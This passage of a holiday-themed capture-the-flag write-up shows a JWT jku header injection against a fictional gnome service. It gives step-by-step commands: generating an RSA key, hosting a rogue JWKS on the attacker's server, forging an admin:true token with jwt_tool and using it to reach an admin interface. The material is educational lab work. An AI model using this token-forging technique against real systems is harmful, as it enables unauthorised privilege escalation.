<p><div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>http://gnome-48371.atnascorp/auth?token<span class="o">=</span>eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTc2MjQ1NywiZXhwIjoxNzY1NzY5NjU3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.nlHoMDoJr57MJc7C7dt1yFadcVRhTy1QGBrJdsz7QE_Dq-yS-iZ1cvMtV4jDQO4sCPkQzEgyXQthQGNs61YcE24Ndp7kO_CCGDeEvzOdvklp7Dcaw0bYK8BE67x4aGCswUPExaRIRlY7jTe_xYWY0T3Eu5ySxXUXdcO3KP0Ft_PwrUAWhscNQFjZIUsZVVaKwpAmasuKzlLe8ODOzQIko6IMtnE1Gwre7yizktKqP6tScOhY3sTVmqCbSgmzjFog-XQKeGjJZMKri6Yy6_rvXmp8ok0yDxtLgwS9FnDoloeiERhXxDBqXTChwBhAH8FLk-wiBu9D9n1f8OzAtge7Jg
</code></pre></div>
<img alt="Second screenshot" src="../../img/objectives/o16/s3.png" /></p>
<p>We receive a session cookie. Let's try accessing the diagnostic interface:</p>
<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aT9lxA.Ad9ykV1vrtF8NoMKOrJvGMNun8g&#39;</span><span class="w"> </span>http://gnome-48371.atnascorp/diagnostic-interface
</code></pre></div>
<p><img alt="Second screenshot" src="../../img/objectives/o16/s4.png" /></p>
<p>"Diagnostic access is only available to admins." <em>Classic</em>! We authenticated successfully but don't have the privileges we need. Our session proves we're a valid user, but the admin flag in our token is set to false. Time to fix that!</p>
<hr />
<h3 id="dissecting-the-token">Dissecting the Token<a class="headerlink" href="#dissecting-the-token" title="Permanent link">‚öìÔ∏é</a></h3>
<p>Paul's terminal has <code>jwt_tool.py</code> installed. Let's decode the token:</p>
<div class="highlight"><pre><span></span><code>jwt_tool.py<span class="w"> </span>eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTc2MjQ1NywiZXhwIjoxNzY1NzY5NjU3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.nlHoMDoJr57MJc7C7dt1yFadcVRhTy1QGBrJdsz7QE_Dq-yS-iZ1cvMtV4jDQO4sCPkQzEgyXQthQGNs61YcE24Ndp7kO_CCGDeEvzOdvklp7Dcaw0bYK8BE67x4aGCswUPExaRIRlY7jTe_xYWY0T3Eu5ySxXUXdcO3KP0Ft_PwrUAWhscNQFjZIUsZVVaKwpAmasuKzlLe8ODOzQIko6IMtnE1Gwre7yizktKqP6tScOhY3sTVmqCbSgmzjFog-XQKeGjJZMKri6Yy6_rvXmp8ok0yDxtLgwS9FnDoloeiERhXxDBqXTChwBhAH8FLk-wiBu9D9n1f8OzAtge7Jg
</code></pre></div>
<p><img alt="Second screenshot" src="../../img/objectives/o16/s5.png" /></p>
<p>Key observations:</p>
<ul>
<li>
<p>Algorithm: <code>RS256</code> (RSA signature)</p>
</li>
<li>
<p>Header includes <code>jku</code>: http://idp.atnascorp/.well-known/jwks.json</p>
</li>
<li>
<p>Payload has <code>admin: false</code></p>
</li>
</ul>
<p>The <code>jku</code> (JWK Set URL) header tells the application where to fetch the public key for signature verification. The application trusts whatever URL is specified here to provide the legitimate public keys. If we can control that URL, we control the verification process. üéÑ</p>
<hr />
<h3 id="the-jku-injection-attack">The JKU Injection Attack<a class="headerlink" href="#the-jku-injection-attack" title="Permanent link">‚öìÔ∏é</a></h3>
<p>Here's the vulnerability: the application trusts whatever URL we put in the <code>jku</code> header to provide the verification keys. There's no validation that the URL points to the legitimate identity provider. This is a well-documented attack vector covered in <a href="https://portswigger.net/web-security/jwt">PortSwigger's JWT</a> security research and explicitly mentioned in <a href="https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2">RFC 7515</a> (the JWS specification), which notes that implementations should validate the jku parameter to prevent exactly this type of attack.</p>
<p>If we can make the application fetch a public key from our server instead of the legitimate IDP, we can:</p>
<ul>
<li>
<p>Generate our own RSA key pair</p>
</li>
<li>
<p>Create a malicious <code>JWT</code> with admin: true</p>
</li>
<li>
<p>Host our public key on Paul's web server</p>
</li>
<li>
<p>Point the <code>jku</code> header to our server</p>
</li>
<li>
<p>Sign the <code>JWT</code> with our private key</p>
</li>
<li>
<p>Watch the application happily verify our forged signature using our own public key</p>
</li>
</ul>
<p>Let's check what the real <code>JWKS</code> looks like:</p>
<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://idp.atnascorp/.well-known/jwks.json
</code></pre></div>
<p><img alt="Second screenshot" src="../../img/objectives/o16/s6.png" /></p>
<p>Standard <code>JWKS</code> format with an RSA public key. Now we create our own!</p>
<hr />
<h3 id="forging-our-own-keys-to-the-kingdom">Forging Our Own Keys to the Kingdom<a class="headerlink" href="#forging-our-own-keys-to-the-kingdom" title="Permanent link">‚öìÔ∏é</a></h3>
<p>First, generate an RSA private key:</p>
<div class="highlight"><pre><span></span><code>openssl<span class="w"> </span>genrsa<span class="w"> </span>-out<span class="w"> </span>paul-private.pem<span class="w"> </span><span class="m">2048</span>
</code></pre></div>
<p>Extract the public key:</p>
<div class="highlight"><pre><span></span><code>openssl<span class="w"> </span>rsa<span class="w"> </span>-in<span class="w"> </span>paul-private.pem<span class="w"> </span>-pubout<span class="w"> </span>-out<span class="w"> </span>paul-public.pem
</code></pre></div>
<p>Now convert the public key to <code>JWKS</code> format using Python. We need to extract the RSA public key's modulus (<code>n</code>) and exponent (<code>e</code>) values and encode them in <code>base64url</code> format, which is what the <code>JWKS</code> standard requires:</p>
<details class="info">
<summary>Converting to JWKS Format</summary>
<div class="highlight"><pre><span></span><code>    <span class="n">python3</span> <span class="o">&lt;&lt;</span> <span class="s1">&#39;EOF&#39;</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
    <span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span> <span class="n">serialization</span>
    <span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.backends</span><span class="w"> </span><span class="kn">import</span> <span class="n">default_backend</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;paul-public.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">pub_key</span> <span class="o">=</span> <span class="n">serialization</span><span class="o">.</span><span class="n">load_pem_public_key</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>

    <span class="n">public_numbers</span> <span class="o">=</span> <span class="n">pub_key</span><span class="o">.</span><span class="n">public_numbers</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">int_to_base64url</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
        <span class="n">b</span> <span class="o">=</span> <span class="n">n</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">((</span><span class="n">n</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>

    <span class="n">jwks</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;keys&quot;</span><span class="p">:</span> <span class="p">[{</span>
            <span class="s2">&quot;kty&quot;</span><span class="p">:</span> <span class="s2">&quot;RSA&quot;</span><span class="p">,</span>
            <span class="s2">&quot;kid&quot;</span><span class="p">:</span> <span class="s2">&quot;paul-key-2025&quot;</span><span class="p">,</span>
            <span class="s2">&quot;use&quot;</span><span class="p">:</span> <span class="s2">&quot;sig&quot;</span><span class="p">,</span>
            <span class="s2">&quot;n&quot;</span><span class="p">:</span> <span class="n">int_to_base64url</span><span class="p">(</span><span class="n">public_numbers</span><span class="o">.</span><span class="n">n</span><span class="p">),</span>
            <span class="s2">&quot;e&quot;</span><span class="p">:</span> <span class="n">int_to_base64url</span><span class="p">(</span><span class="n">public_numbers</span><span class="o">.</span><span class="n">e</span><span class="p">)</span>
        <span class="p">}]</span>
    <span class="p">}</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">jwks</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">EOF</span>
</code></pre></div>
</details>
<p><img alt="Second screenshot" src="../../img/objectives/o16/s7.png" /></p>
<p>Perfect! Now let's host this on Paul's web server.</p>
<hr />
<h3 id="setting-up-our-rogue-north-pole">Setting Up Our Rogue North Pole<a class="headerlink" href="#setting-up-our-rogue-north-pole" title="Permanent link">‚öìÔ∏é</a></h3>
<p>Create the <code>.well-known</code> directory and save our JWKS:</p>
<div class="highlight"><pre><span></span><code>mkdir<span class="w"> </span>-p<span class="w"> </span>~/www/.well-known
</code></pre></div>
<div class="admonition info">
<p class="admonition-title">JWKS</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span>cat<span class="w"> </span>&gt;<span class="w"> </span>~/www/.well-known/jwks.json<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
<span class="s">    {</span>
<span class="s">      &quot;keys&quot;: [</span>
<span class="s">        {</span>
<span class="s">          &quot;kty&quot;: &quot;RSA&quot;,</span>
<span class="s">          &quot;kid&quot;: &quot;paul-key-2025&quot;,</span>
<span class="s">          &quot;use&quot;: &quot;sig&quot;,</span>
<span class="s">          &quot;n&quot;: &quot;190JQitKR0C8KhqCBFkzNIgK4OLkiZH57ROwQw5fPL-J4UB8LCTQ...&quot;,</span>
<span class="s">          &quot;e&quot;: &quot;AQAB&quot;</span>
<span class="s">        }</span>
<span class="s">      ]</span>
<span class="s">    }</span>
<span class="s">    EOF</span>
</code></pre></div>
</div>
<p>Verify it's accessible:</p>
<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://paulweb.neighborhood/.well-known/jwks.json
</code></pre></div>
<p>Excellent! Our rogue JWKS is live and ready to deceive. It's sitting there on Paul's server looking perfectly legitimate, just waiting for the gnome service to ask "hey, is this JWT signature valid?" and our server cheerfully responds "Oh absolutely! I verified it myself!" ‚ùÑÔ∏è</p>
<hr />
<h3 id="building-our-golden-ticket">Building Our Golden Ticket<a class="headerlink" href="#building-our-golden-ticket" title="Permanent link">‚öìÔ∏é</a></h3>
<p>Now we use <code>jwt_tool</code> to create a malicious JWT that:</p>
<ul>
<li>
<p>Points <code>jku</code> to our server</p>
</li>
<li>
<p>Uses our <code>kid</code> value</p>
</li>
<li>
<p>Sets <code>admin: true</code></p>
</li>
<li>
<p>Is signed with our private key</p>
</li>
</ul>
<div class="highlight"><pre><span></span><code>jwt_tool.py<span class="w"> </span>eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTc2MjQ1NywiZXhwIjoxNzY1NzY5NjU3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.nlHoMDoJr57MJc7C7dt1yFadcVRhTy1QGBrJdsz7QE_Dq-yS-iZ1cvMtV4jDQO4sCPkQzEgyXQthQGNs61YcE24Ndp7kO_CCGDeEvzOdvklp7Dcaw0bYK8BE67x4aGCswUPExaRIRlY7jTe_xYWY0T3Eu5ySxXUXdcO3KP0Ft_PwrUAWhscNQFjZIUsZVVaKwpAmasuKzlLe8ODOzQIko6IMtnE1Gwre7yizktKqP6tScOhY3sTVmqCbSgmzjFog-XQKeGjJZMKri6Yy6_rvXmp8ok0yDxtLgwS9FnDoloeiERhXxDBqXTChwBhAH8FLk-wiBu9D9n1f8OzAtge7Jg<span class="w"> </span>-X<span class="w"> </span>s<span class="w"> </span>-ju<span class="w"> </span>http://paulweb.neighborhood/.well-known/jwks.json<span class="w"> </span>-hc<span class="w"> </span>kid<span class="w"> </span>-hv<span class="w"> </span>paul-key-2025<span class="w"> </span>-I<span class="w"> </span>-pc<span class="w"> </span>admin<span class="w"> </span>-pv<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-S<span class="w"> </span>rs256<span class="w"> </span>-pr<span class="w"> </span>paul-private.pem
</code></pre></div>
<p><img alt="Second screenshot" src="../../img/objectives/o16/s8.png" /></p>
<p>Let's verify our exploit <code>JWT</code> has the correct values:</p>
<div class="highlight"><pre><span></span><code>jwt_tool.py<span class="w"> </span>eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJwYXVsLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTc2MjQ1NywiZXhwIjoxNzY1NzY5NjU3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.FdgmkvAHwCmluXNiHmcq2Lu51nt86yFN...
</code></pre></div>
<p><img alt="Second screenshot" src="../../img/objectives/o16/s9.png" /></p>
<p>Perfect! All values are correct:</p>
<ul>
<li>
<p><code>jku</code>: Points to our server</p>
</li>
<li>
<p><code>kid</code>: Matches our <code>JWKS</code></p>
</li>
<li>
<p><code>admin</code>: Set to <code>true</code></p>
</li>
</ul>
<hr />
<h3 id="sleighing-the-admin-login">Sleighing the Admin Login<a class="headerlink" href="#sleighing-the-admin-login" title="Permanent link">‚öìÔ∏é</a></h3>
<p>Time to authenticate with our malicious <code>JWT</code>:</p>
<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>http://gnome-48371.atnascorp/auth?token<span class="o">=</span>eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJwYXVsLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTc2MjQ1NywiZXhwIjoxNzY1NzY5NjU3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.FdgmkvAHwCmluXNiHmcq2Lu51nt86yFN3YlZ0YzzMDJ-BmFVlMWUkROqz56GCDIqB7bNKXr-dS5JM7Dp5iVfQ4TT8LQst1AmyUjibBacStDeOrgBrZTnfsAX9lN8uHTnmafosr9tTm-Kesux4XEQdxyVfHZ8oNLkKbsLHuvFXmpc66-mNvYD3RqeYI_ZTYOz9CZG7qZfGwbtbOKQI-ZQ4zAkKBelx74z4rdZaYpfYoK7TSBpRC0kXNyN1GHpH8vqmYWOT10tbsmaWo3CPm4tb_avU94B1CdorMQ4qPYVikS2bBtSwtEIhth0I6y_e9SeM9MgRcOZCVZRsriYLwpZpg
</code></pre></div>
<p><img alt="Second screenshot" src="../../img/objectives/o16/s10.png" /></p>
<p>Got it! The session cookie now contains admin:true. The application just:</p>
<ul>
<li>
<p>Received our <code>JWT</code></p>
</li>
<li>
<p>Saw the <code>jku</code> header pointing to our server</p>
</li>
<li>
<p>Fetched our malicious <code>JWKS</code> from Paul's server</p>
</li>
<li>
<p>Used our public key to verify the signature we created with our private key</p>
</li>
<li>
<p>Decided everything checks out and granted us admin privileges</p>
</li>
</ul>
<p>We wrote ourselves a credential, then verified our own credential was legitimate. The application had no way to know our <code>JWKS</code> wasn't from the real identity provider. üéÅ</p>
<p>Now let's access the diagnostic interface:</p>
<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aT9oYg.dnR0emOmiNP-gu3Tx-w-rdHo9cA&#39;</span><span class="w"> </span>http://gnome-48371.atnascorp/diagnostic-interface
</code></pre></div>
<p><img alt="Second screenshot" src="../../img/objectives/o16/s11.png" /></p>
<p>Victory! We're in as <code>admin</code>! The diagnostic interface reveals the gnome's naughty list!</p>
<div class="admonition success">
<p class="admonition-title">The Naughty File</p>
<p><code>refrigeration-botnet.bin</code></p>
</div>
<p>A refrigeration botnet?! The gnomes aren't just stealing cookies, they're turning every smart fridge in the neighborhood into their own personal ice army! We successfully exploited the JKU injection vulnerability to uncover their frosty conspiracy. By hosting our own JWKS and crafting a forged JWT, we went from regular gnome user to admin access faster than you can say "Ho ho... wait, that's suspicious!" üéÖ‚ùÑÔ∏è</p>
<div class="nav-buttons">
  <a href="/objectives/o15" class="nav-button nav-left">‚Üê DOSIS Network Down</a>
  <a href="/objectives/o17" class="nav-button nav-right">Next: Quantgnome Leap ‚Üí</a>
</div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
    <a href="https://twitter.com/Aeronique" target="_blank" rel="noopener" title="Twitter" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
    </a>
  
    
    
    
    
    <a href="https://github.com/Aeronique" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
    <a href="https://www.linkedin.com/michelle-duell" target="_blank" rel="noopener" title="Linkedin" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
      
        <script src="../../js/tablesort.js"></script>
      
    
  </body>
</html>